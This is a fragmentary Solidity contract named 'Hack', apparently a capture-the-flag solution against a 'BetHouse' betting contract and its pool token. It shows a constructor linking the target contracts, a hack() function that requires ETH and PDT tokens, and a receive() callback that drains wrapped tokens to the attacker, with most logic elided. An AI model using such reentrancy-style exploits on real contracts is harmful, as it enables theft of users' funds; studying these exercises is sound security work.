...
contract Hack {
    ...
    constructor(address _target, address _sender) payable {
        sender = _sender;
        target = BetHouse(_target);
        pool = Pool(target.pool());
        depositToken = PoolToken(pool.depositToken());
    }

    function hack() public payable {
        require(msg.value == 0.001 ether, "Need ETH");
        require(depositToken.balanceOf(address(this)) >= 5, "Need 5 PDT");
    ...
    receive() external payable {
        ...
        if (balance >= 20) {
            wrappedToken.transfer(sender, 20);
        }
    }
}
